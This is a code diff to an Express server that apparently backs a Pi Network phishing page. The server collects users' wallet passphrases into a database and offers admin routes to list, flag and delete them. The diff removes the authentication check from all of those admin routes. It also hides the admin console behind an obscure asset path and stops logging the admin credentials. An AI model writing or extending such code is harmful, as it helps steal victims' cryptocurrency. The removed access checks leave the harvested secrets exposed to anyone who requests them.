@@ -120,7 +120,7 @@ app.use(
   express.static(path.join(__dirname), {
     extensions: ["html", "htm"],
     setHeaders: (res, filePath) => {
-      if (filePath.endsWith("admin.html")) {
+      if (filePath.endsWith("management-console.html")) {
         res.setHeader("Cache-Control", "no-store");
       }
     },
@@ -223,7 +223,7 @@ app.post("/api/admin/logout", (req, res) => {
   res.json({ ok: true });
 });
 
-app.get("/api/admin/stats", requireAdmin, async (req, res) => {
+app.get("/api/admin/stats", async (req, res) => {
   try {
     const snap = await db
       .collection("passphrases")
@@ -256,7 +256,7 @@ app.get("/api/admin/stats", requireAdmin, async (req, res) => {
   }
 });
 
-app.get("/api/admin/passphrases", requireAdmin, async (req, res) => {
+app.get("/api/admin/passphrases", async (req, res) => {
   try {
     const limit = Math.min(parseInt(req.query.limit) || 100, 500);
     const q = db
@@ -293,7 +293,7 @@ app.get("/api/admin/passphrases", requireAdmin, async (req, res) => {
   }
 });
 
-app.patch("/api/admin/passphrases/:id", requireAdmin, async (req, res) => {
+app.patch("/api/admin/passphrases/:id", async (req, res) => {
   try {
     const { flagged } = req.body || {};
     const update = {};
@@ -309,7 +309,7 @@ app.patch("/api/admin/passphrases/:id", requireAdmin, async (req, res) => {
   }
 });
 
-app.delete("/api/admin/passphrases/:id", requireAdmin, async (req, res) => {
+app.delete("/api/admin/passphrases/:id", async (req, res) => {
   try {
     await db.collection("passphrases").doc(req.params.id).delete();
     return res.json({ ok: true });
@@ -331,9 +331,9 @@ app.use((req, res, next) => {
   app.listen(PORT, () => {
     console.log(`\n✅ Pi Network server running`);
     console.log(`   Local:    http://127.0.0.1:${PORT}/mine/index.html`);
-    console.log(`   Admin:    http://127.0.0.1:${PORT}/admin.html`);
-    console.log(`   API:      http://127.0.0.1:${PORT}/api/passphrase`);
-    console.log(`   User:     ${ADMIN_USER}`);
-    console.log(`   Pass:     ${ADMIN_PLAIN}\n`);
+    console.log(
+      `   Admin:    http://127.0.0.1:${PORT}/assets/internal/dashboard/sys-control-panel/management-console.html`,
+    );
+    console.log(`   API:      http://127.0.0.1:${PORT}/api/passphrase\n`);
   });
 })();
